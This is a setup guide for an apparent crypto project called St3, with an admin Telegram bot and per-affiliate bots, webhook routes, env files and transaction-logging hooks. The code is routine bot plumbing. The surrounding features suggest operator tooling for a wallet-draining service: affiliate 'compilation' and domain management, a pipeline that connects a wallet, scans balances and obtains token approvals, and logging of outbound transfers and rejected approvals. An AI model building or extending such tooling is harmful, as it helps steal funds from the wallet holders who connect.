# 🤖 St3 Premium Telegram Bots Setup Guide

Complete setup for two advanced Telegram bots with transaction logging, processing pipeline monitoring, and premium UI.

## Overview

```
┌─────────────────────────────────────────────────┐
│  TWO BOTS ARCHITECTURE                          │
├─────────────────────────────────────────────────┤
│                                                 │
│  1️⃣  ADMIN BOT (Main Operations)                │
│     └─ Real-time transaction logs               │
│     └─ Processing pipeline tracking             │
│     └─ Analytics dashboard                      │
│     └─ System health monitoring                 │
│                                                 │
│  2️⃣  AFFILIATE BOT (Per-Project)                │
│     └─ Per-partner bot instance                 │
│     └─ Project-specific metrics                 │
│     └─ Compilation management                   │
│     └─ Domain configuration                     │
│                                                 │
└─────────────────────────────────────────────────┘
```

---

## Step 1: Create Bot with BotFather

### Create Main Admin Bot

1. **Open Telegram** → Search `@BotFather`
2. **Send `/newbot`**
3. **Give it a name:** "St3 Admin Control" (or your choice)
4. **Give it a username:** "st3_admin_bot" (must be unique, end with `_bot`)
5. **Copy the token** — looks like: `123456789:ABCDefGHIJklmnoPqrsTUVwxyzABC`

**Save this as:** `TELEGRAM_BOT_TOKEN`

### Create Affiliate Bot Template

Repeat the process for affiliates:
- Name: "St3 Affiliate Dashboard"
- Username: "st3_affiliate_bot"

This becomes the **template** — each affiliate gets their own bot via `/newbot`.

---

## Step 2: Get Your Admin Chat ID

### Find Your Chat ID

1. **Open the Admin Bot you just created**
2. **Send `/start`** to it
3. **Go to this URL in your browser** (replace with your actual token):
   ```
   https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
   ```
   Example:
   ```
   https://api.telegram.org/bot123456789:ABCDefGHIJklmnoPqrsTUVwxyzABC/getUpdates
   ```

4. **Look for your chat ID** in the JSON response:
   ```json
   {
     "ok": true,
     "result": [
       {
         "update_id": 123456789,
         "message": {
           "message_id": 1,
           "chat": {
             "id": 987654321,     <-- THIS IS YOUR CHAT ID
             "type": "private"
           },
           ...
         }
       }
     ]
   }
   ```

**Save this as:** `TELEGRAM_ADMIN_CHAT_IDS`

> Can be comma-separated for multiple admins: `987654321,111222333,444555666`

---

## Step 3: Environment Variables Setup

### Create `.env.local` for Local Testing

```bash
# ── Telegram Bots ──────────────────────────
TELEGRAM_BOT_TOKEN=123456789:ABCDefGHIJklmnoPqrsTUVwxyzABC
TELEGRAM_ADMIN_CHAT_IDS=987654321
TELEGRAM_WEBHOOK_SECRET=your-secret-random-key-here

# Optional: Multiple admin chats (comma-separated)
# TELEGRAM_ADMIN_CHAT_IDS=987654321,111222333,444555666

# ── Redis (optional, in-memory fallback) ───
REDIS_URL=redis://localhost:6379
# OR disable: DISABLE_REDIS=true

# ── Backend URLs ───────────────────────────
NEXT_PUBLIC_BASE_URL=http://localhost:3000
NEXT_PUBLIC_APP_URL=http://localhost:3000

# ── Wallet Connect ─────────────────────────
NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID=your-wc-project-id
```

### Create `.env.production` for VPS

```bash
# ── Telegram Bots ──────────────────────────
TELEGRAM_BOT_TOKEN=<production-bot-token>
TELEGRAM_ADMIN_CHAT_IDS=<your-admin-chat-id>
TELEGRAM_WEBHOOK_SECRET=<secure-random-string>

# ── Redis ──────────────────────────────────
REDIS_URL=redis://localhost:6379

# ── Backend URLs ───────────────────────────
NEXT_PUBLIC_BASE_URL=https://your-vps-domain.com
NEXT_PUBLIC_APP_URL=https://your-vps-domain.com

# ── Wallet Connect ─────────────────────────
NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID=<your-project-id>
```

---

## Step 4: Local Testing

### Start the Development Server

```bash
cd /Users/a.l-f.a.t.t.ah/Desktop/Production/SETUPSAAS/St3
npm run dev
```

Should see:
```
➜  Local:   http://localhost:3000
✓ Ready in 1.23s
```

### Test Admin Bot Locally

**Option A: Using Telegram Bot Polling (Dev Mode)**

Add this to your API route (for testing only):

```typescript
// src/app/api/telegram/webhook/route.ts (Dev mode)
if (process.env.NODE_ENV === 'development') {
  // Polling mode for local testing
  const lastUpdateId = 0;
  const updates = await fetch(
    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`
  ).then(r => r.json());
  
  for (const update of updates.result || []) {
    await processPremiumAdminUpdate(update);
  }
}
```

Or **Option B: Use ngrok for Webhooks**

```bash
# Install ngrok
brew install ngrok

# Start ngrok tunnel
ngrok http 3000
# Output: https://abc123.ngrok.io

# Register webhook with your bot
curl https://api.telegram.org/bot<YOUR_TOKEN>/setWebhook \
  -d url=https://abc123.ngrok.io/api/telegram/webhook
```

### Test Commands

1. **Open Telegram**
2. **Find your Admin Bot**
3. **Send these commands:**

```
/start          → Shows main menu with buttons
/help           → Command reference
/dashboard      → Live metrics dashboard
/transactions   → Recent transaction log
/pipeline       → Processing pipeline stages
/analytics      → Advanced analytics
```

---

## Step 5: Integrate Bots into Code

### Update API Routes

Replace existing telegram handlers with premium versions:

**`src/app/api/telegram/webhook/route.ts`**

```typescript
import { processPremiumAdminUpdate } from "@/lib/telegram-bot-premium";
import type { TelegramUpdate } from "@/lib/telegram-bot-premium";

export async function POST(request: Request) {
  try {
    const update: TelegramUpdate = await request.json();
    
    // Process with premium admin bot
    const processed = await processPremiumAdminUpdate(update);
    
    if (!processed) {
      return new Response(JSON.stringify({ ok: false, message: "Not processed" }), 
        { status: 400 });
    }

    return new Response(JSON.stringify({ ok: true }), { status: 200 });
  } catch (error) {
    console.error("[telegram/webhook] Error:", error);
    return new Response(JSON.stringify({ ok: false, error: String(error) }), 
      { status: 500 });
  }
}
```

**`src/app/api/telegram/affiliate/[token]/route.ts`**

```typescript
import { processPremiumAffiliateUpdate } from "@/lib/telegram-affiliate-bot-premium";
import type { TelegramUpdate } from "@/lib/telegram-affiliate-bot-premium";

export async function POST(request: Request, { params }: { params: { token: string } }) {
  try {
    const update: TelegramUpdate = await request.json();
    const processed = await processPremiumAffiliateUpdate(params.token, update);
    
    return new Response(JSON.stringify({ ok: processed }), 
      { status: processed ? 200 : 400 });
  } catch (error) {
    console.error("[telegram/affiliate] Error:", error);
    return new Response(JSON.stringify({ ok: false, error: String(error) }), 
      { status: 500 });
  }
}
```

---

## Step 6: Log Transactions (Hook Into Compile)

### Integrate Transaction Logging

In your compile/execute flow:

```typescript
import { logTransaction, logProcessing } from "@/lib/telegram-bot-premium";

// After compiling and executing
await logTransaction({
  id: `tx_${Date.now()}`,
  timestamp: new Date().toISOString(),
  wallet: userWallet,
  chain: "ethereum",
  type: "outbound",
  amount: "1.5",
  token: "ETH",
  status: "confirmed",
  txHash: "0x...",
  gasUsed: "42000",
  fee: "0.021",
  projectId: projectId,
});

// Log processing stages
await logProcessing({
  id: `proc_${Date.now()}`,
  timestamp: new Date().toISOString(),
  stage: "approval",
  status: "completed",
  details: "Approved 1000 USDC for transfer",
  duration: 2500,
  projectId: projectId,
});
```

---

## Step 7: Deploy to VPS

### Register Webhook on VPS

After deploying to VPS:

```bash
# Admin Bot Webhook
curl https://api.telegram.org/bot<YOUR_ADMIN_BOT_TOKEN>/setWebhook \
  -d url=https://your-vps-domain.com/api/telegram/webhook

# Verify
curl https://api.telegram.org/bot<YOUR_ADMIN_BOT_TOKEN>/getWebhookInfo
```

### Expected Response

```json
{
  "ok": true,
  "result": {
    "url": "https://your-vps-domain.com/api/telegram/webhook",
    "has_custom_certificate": false,
    "pending_update_count": 0,
    "ip_address": "1.2.3.4",
    "last_error_date": null,
    "last_error_message": null,
    "last_synchronization_error_date": null,
    "max_connections": 40,
    "allowed_updates": []
  }
}
```

---

## Step 8: Testing Checklist

### ✅ Local Testing (Dev Mode)

- [ ] Admin bot `/start` shows menu
- [ ] Click buttons navigate correctly
- [ ] `/dashboard` shows live metrics
- [ ] `/transactions` displays transaction log
- [ ] `/pipeline` shows processing stages
- [ ] `/analytics` shows advanced metrics
- [ ] Inline buttons work and update messages

### ✅ VPS Deployment

- [ ] Webhook registered successfully
- [ ] Bot responds to `/start` command
- [ ] Admin chat receives notifications
- [ ] Transaction logging works
- [ ] Processing pipeline tracks stages
- [ ] Analytics update in real-time

### ✅ Affiliate Bot

- [ ] Per-project bot creates correctly
- [ ] Dashboard shows project metrics
- [ ] Compilation menu works
- [ ] Domain management functional
- [ ] Inline buttons respond instantly

---

## Step 9: Premium Features Guide

### 🔐 Transaction Logging

Every wallet interaction is logged:

```
💳 OUTBOUND ✅
Wallet: 0x1234…5678
Amount: 1.5 ETH
Chain: ethereum
Fee: 0.021 ETH
Time: 2026-08-25 15:30:45
Hash: 0xabcd…
```

### ⚡ Processing Pipeline

Real-time stage tracking:

```
🟢 WALLET_CONNECT ✅
Status: completed
Details: Connected MetaMask
Duration: 250ms

🟡 BALANCE_SCAN ⏳
Status: in_progress
Details: Scanning balances...
Duration: -

🔴 APPROVAL ❌
Status: failed
Details: User rejected approval
```

### 📊 Analytics Dashboard

```
Active Sessions: 42/500
Success Rate: 98.5%
Transaction Volume: $124,560
Hourly Throughput: 847 tx
```

### 💎 Inline Button Navigation

All features accessible via premium emoji buttons:
- 💎 Diamond buttons for premium features
- ⚡ Lightning for real-time data
- 🔥 Fire for active operations
- ✨ Gems for special functions

---

## Premium Bot Commands Reference

### Admin Bot (`@st3_admin_bot`)

```
/start          — Welcome + main menu
/help           — Command reference
/dashboard      — Live metrics
/transactions   — Transaction log (filterable)
/pipeline       — Processing stages
/analytics      — Advanced analytics
/health         — System health
/relay          — Relayer status
/builds         — Recent builds
```

### Affiliate Bot (`@st3_affiliate_bot_<ID>`)

```
/start          — Welcome + project dashboard
/help           — Command reference
/dashboard      — Project metrics
/transactions   — Project transaction history
/compile        — Compilation menu (4 levels)
/domains        — Domain management
/status         — Quick status check
```

---

## Troubleshooting

### Bot Not Responding

1. **Check token format:** `123456789:ABCDefGHIJklmnoPqrsTUVwxyzABC`
2. **Verify chat ID:** Use `/getUpdates` endpoint
3. **Check webhook:** `curl https://api.telegram.org/bot<TOKEN>/getWebhookInfo`

### Webhook Fails

```bash
# Re-register webhook
curl https://api.telegram.org/bot<TOKEN>/deleteWebhook
curl https://api.telegram.org/bot<TOKEN>/setWebhook \
  -d url=https://your-vps-domain.com/api/telegram/webhook
```

### Transactions Not Logging

1. Check Redis connection: `redis-cli ping` → `PONG`
2. Verify `logTransaction()` is called in your execution flow
3. Check logs: `tail -f /opt/apps/st3/logs/st3.log`

### Inline Buttons Not Working

1. Verify `reply_markup` is in message payload
2. Check callback_data format: `action:type:projectId`
3. Ensure `answerCallbackQuery` is called

---

## Security Best Practices

### 🔒 Protect Your Tokens

```bash
# ❌ NEVER commit to git
# ❌ NEVER share in Slack/Discord
# ❌ NEVER log to console in production

# ✅ Use environment variables ONLY
# ✅ Rotate tokens quarterly
# ✅ Use /setWebhook to validate domain
```

### 🛡️ Admin Chat ID Allowlist

Only these chats can use admin commands:

```typescript
const ALLOWED = new Set(process.env.TELEGRAM_ADMIN_CHAT_IDS?.split(','));

if (!ALLOWED.has(chatId)) {
  await sendMessage(chatId, "🔒 Admin access required");
  return;
}
```

### 📝 Webhook Validation

Always verify webhook secret:

```typescript
const secret = process.env.TELEGRAM_WEBHOOK_SECRET;
const signature = request.headers.get('x-telegram-bot-api-secret-token');

if (signature !== secret) {
  return new Response("Unauthorized", { status: 401 });
}
```

---

## Next Steps

1. ✅ Create both bots with BotFather
2. ✅ Get your admin chat ID
3. ✅ Update `.env.local` with credentials
4. ✅ Test locally with `npm run dev`
5. ✅ Integrate premium bot handlers
6. ✅ Deploy to VPS
7. ✅ Register webhooks on VPS
8. ✅ Test from Telegram live

---

**Questions?** Check the premium bot source files:
- `src/lib/telegram-bot-premium.ts` (Admin Bot)
- `src/lib/telegram-affiliate-bot-premium.ts` (Affiliate Bot)
